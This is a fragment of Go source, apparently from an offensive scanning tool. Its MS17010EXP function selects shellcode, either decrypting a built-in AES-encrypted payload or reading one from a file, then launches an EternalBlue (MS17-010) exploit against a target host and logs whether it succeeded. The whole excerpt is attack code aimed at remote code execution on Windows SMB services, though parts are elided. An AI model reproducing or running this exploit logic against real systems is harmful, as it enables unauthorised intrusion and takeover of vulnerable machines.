...
func MS17010EXP(info *common2.HostInfo) {
	...
	case "guest":
		...
		sc = AesDecrypt(sc_enc, key)
	default:
		if strings.Contains(common2.SC, "file:") {
			read, err := ioutil.ReadFile(common2.SC[5:])
			if err != nil {
				errlog := fmt.Sprintf("[-] ms17010 sc readfile %v error: %v", common2.SC, err)
	...
	if err != nil {
		common2.LogError("[-] " + info.Host + " MS17-010 shellcode decode error " + err.Error())
		return
	}
	err = eternalBlue(address, 12, 12, sc1)
	if err != nil {
		common2.LogError("[-] " + info.Host + " MS17-010 exp failed " + err.Error())
		return
	}
	common2.LogSuccess("[*] " + info.Host + "\tMS17-010\texploit end")
}
